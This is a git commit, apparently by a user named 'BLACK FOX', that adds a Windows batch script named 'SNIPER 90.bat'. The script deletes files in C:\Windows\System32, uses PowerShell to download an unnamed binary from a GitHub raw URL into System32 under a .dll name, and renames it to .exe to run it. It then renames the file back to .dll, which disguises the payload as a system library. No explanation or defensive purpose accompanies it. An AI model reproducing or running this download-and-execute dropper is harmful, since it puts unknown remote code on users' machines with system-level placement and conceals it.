5147ecb59c02117b123c73891fc0c49b3d6efd57
BLACK FOX <amin89310@gmail.com>
2025-04-28 02:58:14 -0700

    Add files via upload

---
+++ SNIPER 90.bat
@@ -0,0 +1,23 @@
+@echo off
+echo BLACK FOX
+
+:: Step 1: Delete old file if it exists
+if exist "C:\Windows\System32\SNIPER90.dll" del /f /q "C:\Windows\System32\SNIPER90.dll"
+if exist "C:\Windows\System32\BLACK FOX.exe" del /f /q "C:\Windows\System32\BLACK FOX.exe"
+
+:: Step 2: Download the new file
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/BLACK89310/kanel/raw/refs/heads/main/BLACK%20FOX%20BD90' -OutFile 'C:\Windows\System32\SNIPER90.dll'"
+
+:: Step 3: Rename the downloaded DLL to EXE
+ren "C:\Windows\System32\SNIPER90.dll" "BLACK FOX.exe"
+
+:: Step 4: Run the EXE
+start "" "C:\Windows\System32\BLACK FOX.exe"
+
+:: Step 5: Wait for 5 seconds
+timeout /t 5 /nobreak
+
+:: Step 6: Rename the EXE back to DLL
+ren "C:\Windows\System32\BLACK FOX.exe" "SNIPER90.dll"
+
+pause
